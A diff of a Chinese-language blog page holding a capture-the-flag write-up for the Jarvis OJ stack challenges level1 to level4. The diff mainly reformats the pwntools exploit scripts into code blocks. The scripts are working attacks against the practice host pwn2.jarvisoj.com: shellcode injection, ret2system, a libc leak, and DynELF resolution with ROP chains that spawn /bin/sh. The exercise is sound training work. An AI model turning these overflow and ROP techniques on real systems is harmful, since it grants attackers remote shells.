@@ -90,7 +90,7 @@
 <meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxmy00vlp4j30pm08wabu.jpg">
 <meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxmy8skp9oj30ha06udgl.jpg">
 <meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxmydm4zuaj30hq05m74u.jpg">
-<meta property="og:updated_time" content="2018-11-27T13:48:45.538Z">
+<meta property="og:updated_time" content="2018-11-27T13:51:41.383Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwn学习（10）jarvis栈部分">
 <meta name="twitter:description" content="中级ROP基本上看完了，打算做一些题目练练手，想到了之前学习逆向的时候jarvis oj上有题目的汇总，就去看了看，顺便把栈部分的题目都试着做了一下，恰好今天还算是有空，就写写wp吧 Tell me something入门题目，漏洞很明显，而且直接就给了可以拿到flag的函数，溢出覆盖返回地址即可exp如下： from pwn import * #p = process(&amp;apos;./guest">
@@ -380,9 +380,21 @@ fakeebp = &apos;aaaaaaaa&apos;
 payload = pad + fakeebp + p64(elf.symbols[&apos;callsystem&apos;])
 p.sendline(payload)
 p.interactive()
-</code></pre><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>同样很简单，exp如下：<br>    from pwn import *<br>    p = remote(‘pwn2.jarvisoj.com’,9877)<br>    shellcode = asm(shellcraft.sh())<br>    p.recvuntil(“What’s this:”)<br>    buf_addr = p.recv()[0:10]<br>    log.info(buf_addr)<br>    buf_addr = int(buf_addr,16)<br>    log.info(buf_addr)<br>    payload = shellcode.ljust(140,’a’) + p32(buf_addr)<br>    p.sendline(payload)<br>    p.interactive()</p>
-<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>依旧很简单。。。<br>    from pwn import *</p>
-<pre><code>#p = process(&apos;./level2&apos;)
+</code></pre><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>同样很简单，exp如下：</p>
+<pre><code>from pwn import *
+p = remote(&apos;pwn2.jarvisoj.com&apos;,9877)
+shellcode = asm(shellcraft.sh())
+p.recvuntil(&quot;What&apos;s this:&quot;)
+buf_addr = p.recv()[0:10]
+log.info(buf_addr)
+buf_addr = int(buf_addr,16)
+log.info(buf_addr)
+payload = shellcode.ljust(140,&apos;a&apos;) + p32(buf_addr)
+p.sendline(payload)
+p.interactive()
+</code></pre><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>依旧很简单。。。</p>
+<pre><code>from pwn import *
+#p = process(&apos;./level2&apos;)
 p = remote(&apos;pwn2.jarvisoj.com&apos;,9878)
 elf = ELF(&apos;./level2&apos;)
 
@@ -391,8 +403,9 @@ bin_addr = 0x804A024
 payload = 140*&apos;a&apos; + p32(system_addr) + &quot;aaaa&quot; + p32(bin_addr)
 p.sendline(payload)
 p.interactive()
-</code></pre><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>很明显的溢出，但是没有system函数，也没有/bin/sh，那我们就考虑泄漏libc了，程序调用过了write，但就用这个函数了<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmy8skp9oj30ha06udgl.jpg" alt=""><br>exp如下：<br>    from pwn import *</p>
-<pre><code>#p = process(&apos;./level3&apos;)
+</code></pre><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>很明显的溢出，但是没有system函数，也没有/bin/sh，那我们就考虑泄漏libc了，程序调用过了write，但就用这个函数了<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmy8skp9oj30ha06udgl.jpg" alt=""><br>exp如下：</p>
+<pre><code>from pwn import *
+#p = process(&apos;./level3&apos;)
 p = remote(&apos;pwn2.jarvisoj.com&apos;,9879)
 elf = ELF(&apos;./level3&apos;)
 #libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
@@ -418,8 +431,30 @@ payload2 = pad + fakeebp + p32(system_addr) + &apos;dead&apos; + p32(sh_addr)
 p.sendline(payload2)
 
 p.interactive()
-</code></pre><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>这个题目成功挡住了我，先拿ida看看<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmydm4zuaj30hq05m74u.jpg" alt=""><br>看上去和上一个题没啥区别……还是要泄漏libc。<br>做的时候偷了个懒，直接拿上个题的脚本试了试，结果本地成了……当时还以为题目放重了，结果remote的时候出错了，这才意识到题目没给libc，这就很尴尬了。<br>怎么解决没有libc的问题呢？这时候就要用到一个新武器了—-DynELF。<br>这里给个网址，官方介绍的很详细了<br><a href="https://pwntoolsdocinzh-cn.readthedocs.io/en/master/dynelf.html" target="_blank" rel="noopener">https://pwntoolsdocinzh-cn.readthedocs.io/en/master/dynelf.html</a><br>exp如下：<br>    from pwn import <em><br>    context(arch = ‘i386’, os = ‘linux’)<br>    r = remote(‘pwn2.jarvisoj.com’, 9880)<br>    e=ELF(‘./level4’)<br>    junk=’A’</em>(0x88+0x04)<br>    read_plt=e.symbols[‘read’]<br>    write_plt=e.symbols[‘write’]<br>    data_bss_addr=e.symbols[‘__bss_start’]<br>    func_reload_addr=e.symbols[‘vulnerable_function’]<br>    def leak(address):<br>        payload1=junk+p32(write_plt)+p32(func_reload_addr)+p32(0x01)+p32(address)+p32(0x04)<br>        r.sendline(payload1)<br>        leak_addr=r.recv(4)<br>        return leak_addr<br>    d=DynELF(leak,elf=e)<br>    system_addr=d.lookup(‘system’,’libc’)<br>    payload2=junk+p32(read_plt)+p32(func_reload_addr)+p32(0x00)+p32(data_bss_addr)+p32(0x08)<br>    r.sendline(payload2)<br>    r.send(‘/bin/sh\x00’)<br>    payload3=junk+p32(system_addr)+p32(func_reload_addr)+p32(data_bss_addr)<br>    r.send(payload3)<br>    r.interactive()</p>
-<p>Successful</p>
+</code></pre><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>这个题目成功挡住了我，先拿ida看看<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmydm4zuaj30hq05m74u.jpg" alt=""><br>看上去和上一个题没啥区别……还是要泄漏libc。<br>做的时候偷了个懒，直接拿上个题的脚本试了试，结果本地成了……当时还以为题目放重了，结果remote的时候出错了，这才意识到题目没给libc，这就很尴尬了。<br>怎么解决没有libc的问题呢？这时候就要用到一个新武器了—-DynELF。<br>这里给个网址，官方介绍的很详细了<br><a href="https://pwntoolsdocinzh-cn.readthedocs.io/en/master/dynelf.html" target="_blank" rel="noopener">https://pwntoolsdocinzh-cn.readthedocs.io/en/master/dynelf.html</a><br>exp如下：</p>
+<pre><code>from pwn import *
+context(arch = &apos;i386&apos;, os = &apos;linux&apos;)
+r = remote(&apos;pwn2.jarvisoj.com&apos;, 9880)
+e=ELF(&apos;./level4&apos;)
+junk=&apos;A&apos;*(0x88+0x04)
+read_plt=e.symbols[&apos;read&apos;]
+write_plt=e.symbols[&apos;write&apos;]
+data_bss_addr=e.symbols[&apos;__bss_start&apos;]
+func_reload_addr=e.symbols[&apos;vulnerable_function&apos;]
+def leak(address):
+    payload1=junk+p32(write_plt)+p32(func_reload_addr)+p32(0x01)+p32(address)+p32(0x04)
+    r.sendline(payload1)
+    leak_addr=r.recv(4)
+    return leak_addr
+d=DynELF(leak,elf=e)
+system_addr=d.lookup(&apos;system&apos;,&apos;libc&apos;)
+payload2=junk+p32(read_plt)+p32(func_reload_addr)+p32(0x00)+p32(data_bss_addr)+p32(0x08)
+r.sendline(payload2)
+r.send(&apos;/bin/sh\x00&apos;)
+payload3=junk+p32(system_addr)+p32(func_reload_addr)+p32(data_bss_addr)
+r.send(payload3)
+r.interactive()
+</code></pre><p>Successful</p>
 
       
     </div>
